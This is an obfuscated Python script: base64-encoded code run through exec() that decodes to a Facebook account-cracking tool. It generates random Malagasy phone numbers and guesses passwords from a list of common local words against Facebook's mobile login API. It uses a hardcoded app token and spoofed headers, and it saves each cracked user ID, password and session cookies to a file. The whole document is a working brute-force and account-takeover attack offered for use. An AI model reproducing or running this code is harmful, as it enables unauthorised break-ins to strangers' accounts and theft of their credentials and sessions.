#ENCODED BY : MUMIT ISLAM HIMU
#ENCRYPTION : Py3 BASE64
#GITHUB : https://github.com/MUMIT-404-CYBER
#----------------------------------------------
import base64
exec(base64.b64decode(b'IyBEw6lmaW5pciBsZSBudW3DqXJvIGRlIHZlcnNpb24KdmVyc2lvbl9hY3R1ZWxsZSA9ICIyLjAiCgoKCmltcG9ydCBvcwppbXBvcnQgdGltZQppbXBvcnQgcmFuZG9tCmltcG9ydCBwbGF0Zm9ybQppbXBvcnQgc3RyaW5nIAppbXBvcnQgdXVpZAppbXBvcnQganNvbgppbXBvcnQgc3VicHJvY2Vzcwpmcm9tIGNvbmN1cnJlbnQuZnV0dXJlcyBpbXBvcnQgVGhyZWFkUG9vbEV4ZWN1dG9yIGFzIHRyZWQKaW1wb3J0IHJlcXVlc3RzCmltcG9ydCBzeXMKaW1wb3J0IHNlY3JldHMKaW1wb3J0IGdldHBhc3MKCiMtLS0tLS0tLS0tLS0tY29sb3ItLS0tLS0tLS0tLS0tLS0tIwpyPSdcMDMzWzc7OTFtJwp2PSdcMDMzWzc7OTJtJwpTPSdcMDMzWzBtJwpPPSdcMDMzWzM4OzU7MjA4bScKYmJsYWNrPSJcMDMzWzE7MzBtIiAgICAgICAgICMgQmxhY2sKTT0iXDAzM1sxOzMxbSIgICAgICAgICAgICAjIFJlZApIPSJcMDMzWzE7MzJtIiAgICAgICAgICMgR3JlZW4KYnllbGxvdz0iXDAzM1sxOzMzbSIgICAgICAgICMgWWVsbG93CmJibHVlPSJcMDMzWzE7MzRtIiAgICAgICAgICAjIEJsdWUKUD0iXDAzM1sxOzM1bSIgICAgICAgICMgUHVycGxlCkM9IlwwMzNbMTszNm0iICAgICAgICAgICMgQ3lhbgpCPSJcMDMzWzE7MzdtIiAgICAgICAgICMgV2hpdGUKbXlfY29sb3IgPSBbCiBCLEMsUCxIXQp3YXJuYSA9IHJhbmRvbS5jaG9pY2UobXlfY29sb3IpCm9rcz1bXQpjcHM9W10KbG9vcD0wCgojIExpc3RlIGRlcyBjb3VsZXVycyBwb3VyIGxlIGxvZ28sIGxlcyBsaWduZXMgZXQgY2hhcXVlIG1vdApsb2dvX2NvbG9ycyA9IFtCLCBDLCBQLCBIXQpsaW5lX2NvbG9ycyA9IFtiYmxhY2ssIE0sIEgsIGJ5ZWxsb3csIGJibHVlLCBQLCBDLCBCXQp3b3JkX2NvbG9ycyA9IFtCLCBDLCBQLCBILCBNLCBieWVsbG93LCBiYmx1ZSwgUCwgQywgQl0KIy0tLS0tLS0tLS0tLS1sb2dvLS0tLS0tLS0tLS0tLS0tLS0jCmxvZ289KGYnJyd7Qn0KICAgICAgICAgICAgICAgIOKggOKggOKEjfCdlYbihJ3wnZWL8J2UvOKElfCdlYrwnZWA8J2UuAp7d2FybmF9LS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS17Qn0Ke0J9R0lUSFVCICAgOiAge2JibGFja31ob3J0ZW5zaWHwn5KXCntCfUZBQ0VCT09LIDogIHtiYmx1ZX1Ib3J0ZW5zaWEgyprJuMme8J+Slwp7Qn1WRVJTSU9OICA6ICB7TX1WNC418J+SmAp7Qn1NRVRIT0RFICA6ICB7dn1BcGl7U30KLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS17Qn0nJycpCiMtLS0tLS0tLS0tLS0tbGluZXggZGVmIC0tLS0tLS0tLS0tLS0jCmRlZiBsaW5leCgpOgogICAgcHJpbnQoZid7d2FybmF9LS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS17Qn0nKQojLS0tLS0tLS0tLS0tLWNsZWFyIGRlZiAtLS0tLS0tLS0tLS0tIwpkZWYgY2xlYXIoKToKICAgIG9zLnN5c3RlbSgnY2xlYXInKQogICAgcHJpbnQobG9nbykKIy0tLS0tLS0tLS0tLS1tYWluIGRlZi0tLS0tLS0tLS0tLSMKZGVmIGNsb25lKCk6CiAgICBjbGVhcigpCiAgICBwcmludChmJ3tCfSBbe3dhcm5hfTAxe0J9XSBTVEFSVCBDTE9OSU5HIE1MRycpCiAgICBwcmludChmJ3tCfSBbe3dhcm5hfTAwe0J9XSBFWElUJykKICAgIGxpbmV4KCkKICAgIG9wdGlvbj1pbnB1dChmJyB7Qn1be3dhcm5hfT8/e0J9XSBDSE9JU0lSIE1FTlUgPj4gJykKICAgIGlmIG9wdGlvbiBpbiBbJzAxJywnMSddOgogICAgICAgIE1MR19DTE9OSU5HKCkKICAgIGVsc2U6CiAgICAgICAgZXhpdCgnIE1FUkNJIEJFQVVDT1VQICA6KScpCiMtLS0tLS0tLS0tLS0tIE1MRyBjbG9uZSBkZWYgLS0tLS0tLS0tLSMKZGVmIE1MR19DTE9OSU5HKCk6CiAgICB1c2VyPVtdCiAgICBjbGVhcigpCiAgICBwcmludCgnIENPREUgU0lNIE1BTEFHQVNZIDogWysyNjEzMl0gWysyNjEzNF0gWysyNjEzOF0gWysyNjEzM10nKQogICAgY29kZT1pbnB1dCgnIENIT0lTSVIgQ09ERSBTSU0g8J+Smj4+JykKICAgIGxpbmV4KCkKICAgIHByaW50KCcgRVhBTVBMRSBMSU1JVCA6IFsxMDAwXSBbMjAwMF0gWzUwMDBdIFsxMDAwMF0nKQogICAgdHJ5OgogICAgICAgIGxpbWl0PWludChpbnB1dCgnIExJTUlUIPCfkpk+PiAnKSkKICAgIGV4Y2VwdCBWYWx1ZUVycm9yOgogICAgICAgIGxpbWl0PTUwMDAwCiAgICBjbGVhcigpCiAgICBmb3Igbm1iciBpbiByYW5nZShsaW1pdCk6CiAgICAgICAgbm1wPScnLmpvaW4obWFwKHN0ciwgZ2VuZXJhdGVfcmFuZG9tX3NlcXVlbmNlKDcpKSkKICAgICAgICB1c2VyLmFwcGVuZChubXApCiAgICB3aXRoIHRyZWQobWF4X3dvcmtlcnM9NjApIGFzIERpcHRvOgogICAgICAgIHRsPXN0cihsZW4odXNlcikpCiAgICAgICAgcHJpbnQoJyBUT1RBTCBBQ0NPVU5UIDogJyt0bCkKICAgICAgICBwcmludCgnIFlPVVIgU0lNIENPREXwn4ey8J+HrCA6ICcrY29kZSkKICAgICAgICBwcmludChmIntCfUZJTEUgU0FWRUQgICAge1N9Ont2fS9zZGNhcmQvSG9ydGVuc2lhLUlEUy9Ib3J0ZW5zaWEtT0sudHh0e1N9IikKICAgICAgICBsaW5leCgpCiAgICAgICAgZm9yIHBzeCBpbiB1c2VyOgogICAgICAgICAgICBpZHM9Y29kZStwc3gKICAgICAgICAgICAgcGFzc2xpc3Q9W3BzeCxpZHMsaWRzWzo3XSxpZHNbOjZdLGlkc1s1Ol0saWRzWzQ6XSwnbm9tZW5hJywnbWFsYWxhJywnbWFsYWxha28nLCd2YWRpa28nLCdmYW5pcnknLCdqZXNvc3knLCdmYW5ldmEnLCdGYW5ldmEnLCd0YWhpYW5hJywndGFoaW5hJywndGFoaXJ5JywnTm9tZW5hJywnbGFmYXRyYScsJ2ZhaGVuZHJlbmEnLCdGYWhlbmRyZW5hJywnYW1ib2FyYScsJ0FtYm9hcmEnLCdtaWFuZ2FseScsJ01pYW5nYWx5JywnbWlhbmdvbGEnLCdNaWFuZ29sYScsJ2ZhbmFzaW5hJywnRmFuYXNpbmEnLCd2YXJvdHJhJywnVmFyb3RyYScsJ25pYWluYScsJ3NhbmRyZWFoJywnU2FuZHJlYWgnLCdmYW5kcmVzZW5hJywnRmFuZHJlc2VuYScsJ25hbnRlbmFpbmEnLCdyYWtvdG9tYWxhbGEnLCdSYWtvdG9tYWxhbGEnLCd0YW5qb25hJywnVGFuam9uYScsJ3NhbG9oeScsJ1NhbG9oeScsJ3NvbG9mbycsJ1NvbG9mbycsJ05hbnRlbmFpbmEnLCduaWxhaW5hJywnTmlsYWluYScsJ25pcmluYScsJ05pcmluYScsJ05hcmluZHJhJywnUmFrb3RvJywnZml0YWhpYW5hJywnRml0YWhpYW5hJywnZGlhbW9uZHJhJywnRGlhbW9uZHJhJywnZmFuaXJ5JywnRmFuaXJ5JywncmFrb3RvJywnU2FmaWR5Jywnc2FmaWR5JywnaGFzaW5hJywnSGFzaW5hJywnZmVsYW5hJywnRmVsYW5hJywnRmFyYW5pcmluYScsJ2ZhcmFuaXJpbmEnLCdhbmphcmEnLCdtaXJhbnRvJywnUmFuZHJpYScsJ3JhbmRyaWEnLCd0c2lsYXZpbmEnLCd0b2Rpc29hJywnVG9kaXNvYScsJ21pbGVseScsJ1RzaWxhdmluYScsJ21lbmRyaWthJywnTWVuZHJpa2EnLCd0YXRhcmEnLCdUYXRhcmEnLCd0YW50YXJhJywnVGFudGFyYScsJ3Nhcmlha2EnXQogICAgICAgICAgICBEaXB0by5zdWJtaXQobWV0aG9kX2NyYWNrLGlkcyxwYXNzbGlzdCkKICAgICAgICAgICAgCiAgICBsaW5leCgpCiAgICBwcmludCgnIFRPVEFMIE9LIElEICcrc3RyKGxlbihva3MpKSkKICAgIHByaW50KCcgVE9UQUwgQ1AgSUQgJytzdHIobGVuKGNwcykpKQogICAgaW5wdXQoJyBSRVRPVVIgTUVOVScpCiAgICBjbG9uZSgpCiMtLS0tLS0tLS0tLS0gbWV0aG9kIGNyYWNrIGRlZiAtLS0tLS0tLS0jCmRlZiBtZXRob2RfY3JhY2soaWRzLCBwYXNzbGlzdCk6CiAgICBnbG9iYWwgb2tzCiAgICBnbG9iYWwgY3BzCiAgICBnbG9iYWwgbG9vcAogICAgdHJ5OgogICAgICAgIGZvciBwYXMgaW4gcGFzc2xpc3Q6CiAgICAgICAgICAgIHN5cy5zdGRvdXQud3JpdGUoJ1xyXHIgXDAzM1sxOzM3bVtNTEddICVzPD5cMDMzWzE7MzJtT0s6JXMnJShsb29wLGxlbihva3MpKSkKICAgICAgICAgICAgc3lzLnN0ZG91dC5mbHVzaCgpCiAgICAgICAgICAgIGFkaWQ9c3RyKHV1aWQudXVpZDQoKSkKICAgICAgICAgICAgZGV2aWNlX2lkPXN0cih1dWlkLnV1aWQ0KCkpCiAgICAgICAgICAgIGRhdGF4PXsnYWRpZCc6IGFkaWQsICdmb3JtYXQnOiAnanNvbicsICdkZXZpY2VfaWQnOiBkZXZpY2VfaWQsICdlbWFpbCc6IGlkcywgJ3Bhc3N3b3JkJzogcGFzLCAnZ2VuZXJhdGVfYW5hbHl0aWNzX2NsYWltcyc6ICcxJywgJ2NyZWRlbnRpYWxzX3R5cGUnOiAncGFzc3dvcmQnLCAnc291cmNlJzogJ2xvZ2luJywgJ2Vycm9yX2RldGFpbF90eXBlJzogJ2J1dHRvbl93aXRoX2Rpc2FibGVkJywgJ2Vucm9sbF9taXNhdXRoJzogJ2ZhbHNlJywgJ2dlbmVyYXRlX3Nlc3Npb25fY29va2llcyc6ICcxJywgJ2dlbmVyYXRlX21hY2hpbmVfaWQnOiAnMScsICdtZXRhX2luZl9mYm1ldGEnOiAnJywgJ2N1cnJlbnRseV9sb2dnZWRfaW5fdXNlcmlkJzogJzAnLCAnZmJfYXBpX3JlcV9mcmllbmRseV9uYW1lJzogJ2F1dGhlbnRpY2F0ZSd9CiAgICAgICAgICAgIGhlYWRlcj17J1VzZXItQWdlbnQnOiAnW0ZCQU4vRkI0QTtGQkFWLyIrc3RyKHJhbmRvbS5jaG9pY2UocmFuZ2UoMTIxLDc5OCkpKSsiLjAuMC4yNy4iK3N0cihyYW5kb20uY2hvaWNlKHJhbmdlKDIxLDk4KSkpKyI7RkJCVi8iK3N0cihyYW5kb20uY2hvaWNlKHJhbmdlKDEyMzQxMjMxLDc5ODkxMzIxOCkpKSsiO0ZCRE0ve2RlbnNpdHk9My4wLHdpZHRoPTEwODAsaGVpZ2h0PTE3NzZ9O0ZCTEMvZW5fVVM7RkJSVi83NDUwMzkzNTtGQkNSL1JvYmk7RkJNRi9tb3Rvcm9sYTtGQkJEL21vdG9yb2xhO0ZCUE4vY29tLmZhY2Vib29rLmthdGFuYTtGQkRWLyIrbW9kZWwrIjtGQlNWLzcuMS4xO0ZCT1AvMTtGQkNBL2FybWVhYmktdjdhOmFybWVhYmk7XScsICdBY2NlcHQtRW5jb2RpbmcnOiAnZ3ppcCwgZGVmbGF0ZScsICdBY2NlcHQnOiAnKi8qJywgJ0Nvbm5lY3Rpb24nOiAna2VlcC1hbGl2ZScsICdBdXRob3JpemF0aW9uJzogJ09BdXRoIDM1MDY4NTUzMTcyOHw2MmY4Y2U5Zjc0YjEyZjg0YzEyM2NjMjM0MzdhNGEzMicsICdYLUZCLUZyaWVuZGx5LU5hbWUnOiAnYXV0aGVudGljYXRlJywgJ1gtRkItQ29ubmVjdGlvbi1CYW5kd2lkdGgnOiAnMjE0MzUnLCAnWC1GQi1OZXQtSE5JJzogJzM1NzkzJywgJ1gtRkItU0lNLUhOSSc6ICczNzg1NScsICdYLUZCLUNvbm5lY3Rpb24tVHlwZSc6ICd1bmtub3duJywgJ0NvbnRlbnQtVHlwZSc6ICdhcHBsaWNhdGlvbi94LXd3dy1mb3JtLXVybGVuY29kZWQnLCAnWC1GQi1IVFRQLUVuZ2luZSc6ICdMaWdlcid9CiAgICAgICAgICAgIHVybD0naHR0cHM6Ly9hcGkuZmFjZWJvb2suY29tL21ldGhvZC9hdXRoLmxvZ2luJwogICAgICAgICAgICByZXF4PXJlcXVlc3RzLnBvc3QodXJsLGRhdGE9ZGF0YXgsaGVhZGVycz1oZWFkZXIpLmpzb24oKQogICAgICAgICAgICBpZiAnc2Vzc2lvbl9rZXknIGluIHJlcXg6CiAgICAgICAgICAgICAgICB0cnk6CiAgICAgICAgICAgICAgICAgICAgdWlkPXJlcXhbJ3VpZCddCiAgICAgICAgICAgICAgICBleGNlcHQ6CiAgICAgICAgICAgICAgICAgICAgdWlkPWlkcwogICAgICAgICAgICAgICAgaWYgc3RyKHVpZCkgaW4gb2tzOgogICAgICAgICAgICAgICAgICAgIGJyZWFrCiAgICAgICAgICAgICAgICBlbHNlOgogICAgICAgICAgICAgICAgICAgIHByaW50KCdcclxyIFwwMzNbMTszMm1bSG9ydGVuc2lhLU9LXSAnK3N0cih1aWQpKycgfCAnK3BhcysnXDAzM1sxOzM3bScpCiAgICAgICAgICAgICAgICAgICAgY29raT0iOyIuam9pbihpWyJuYW1lIl0rIj0iK2lbInZhbHVlIl0gZm9yIGkgaW4gcmVxeFsic2Vzc2lvbl9jb29raWVzIl0pCiAgICAgICAgICAgICAgICAgICAgcHJpbnQoJ1wwMzNbMTszMm0gW0NPT0tJRVNdICcrY29raSkKICAgICAgICAgICAgICAgICAgICAjIFbDqXJpZmllciBzaSBsZSBkb3NzaWVyIEhvcnRlLUlEUyBleGlzdGUgZXQgbGUgY3LDqWVyIHNpIG7DqWNlc3NhaXJlCiAgICAgICAgICAgICAgICAgICAgaWYgbm90IG9zLnBhdGguZXhpc3RzKCIvc2RjYXJkL0hvcnRlbnNpYS1JRFMiKToKICAgICAgICAgICAgICAgICAgICAgICAgb3MubWFrZWRpcnMoIi9zZGNhcmQvSG9ydGVuc2lhLUlEUyIpCiAgICAgICAgICAgICAgICAgICAgIyBFbnJlZ2lzdHJlciBkYW5zIGxlIGZpY2hpZXIgSG9ydGUtT0sudHh0CiAgICAgICAgICAgICAgICAgICAgd2l0aCBvcGVuKG9zLnBhdGguam9pbigiL3NkY2FyZC9Ib3J0ZW5zaWEtSURTIiwgIkhvcnRlbnNpYS1PSy50eHQiKSwgJ2EnKSBhcyBmOgogICAgICAgICAgICAgICAgICAgICAgICBmLndyaXRlKHN0cih1aWQpKyd8JytwYXMrJ3wnK2Nva2krJ1xuJykKICAgICAgICAgICAgICAgICAgICBva3MuYXBwZW5kKHN0cih1aWQpKQogICAgICAgICAgICAgICAgICAgIGJyZWFrCiAgICAgICAgICAgIGVsc2U6CiAgICAgICAgICAgICAgICBjb250aW51ZQogICAgICAgIGxvb3ArPTEKICAgIGV4Y2VwdDoKICAgICAgICBwYXNzCiMtLS0tLS0tLS0tLS0tZW5kLS0tLS0tLS0tLS0tLS0tLSMKCiMgR8OpbsOpcmF0ZXVyIGRlIHPDqXF1ZW5jZSBhbMOpYXRvaXJlCmRlZiBnZW5lcmF0ZV9yYW5kb21fc2VxdWVuY2UobGVuZ3RoKToKICAgIHNlcXVlbmNlID0gW3JhbmRvbS5jaG9pY2Uoc3RyaW5nLmRpZ2l0cykgZm9yIF8gaW4gcmFuZ2UobGVuZ3RoKV0KICAgIHJldHVybiBzZXF1ZW5jZQoKZGVmIGtleSgpOgoJZ2xvYmFsIGFwcgoJYXByID0gb3BlbigiYXByLnR4dCIsInIiKS5yZWFkKCkKCXN5c19pbmZvPXBsYXRmb3JtLnVuYW1lKCkKCW1vZHVsZT1zeXNfaW5mby52ZXJzaW9uCglpZiBtb2R1bGUgaW4gYXByOgoJCXBhc3MKCWNsb25lKCkKZGVmIG1haigpOgoJCQlvcy5zeXN0ZW0oImNsZWFyIikKCQkJZmE9KGYie0N9W3tCfSt7Q31dVE9PTCBQUklWQVRFIikKCQkJZm9yIGZheCBpbiBmYToKCQkJCXByaW50KGZheCxlbmQ9JycsZmx1c2g9VHJ1ZSkKCQkJCXRpbWUuc2xlZXAoMC4wNSkKCQkJdHJ5OgoJCQkJb3Muc3lzdGVtKCJjbGVhciIpCgkJCQlmYWI9KGYie3Z9VG9sbCBVcGRhdGUgTm93e1N9IikKCQkJCWZvciBmYWJ4IGluIGZhYjoKCQkJCQkJCQlwcmludChmYWJ4LGVuZD0nJyxmbHVzaD1UcnVlKQoJCQkJCQkJCXRpbWUuc2xlZXAoMC4wOCkKCQkJCWtleSgpCgkJCWV4Y2VwdCBzdWJwcm9jZXNzLkNhbGxlZFByb2Nlc3NFcnJvcjoKCQkJCQkJCQlvcy5zeXN0ZW0oImNsZWFyIikKCQkJCQkJCQlwcmludChmIntyfU5vIGNvbm5lY3Rpb257U30iKQoJCQkJCQkJCXRpbWUuc2xlZXAoMSkKCQkJCQkJCQltYWooKQoJCQkJCQkJCQptYWooKQ=='))
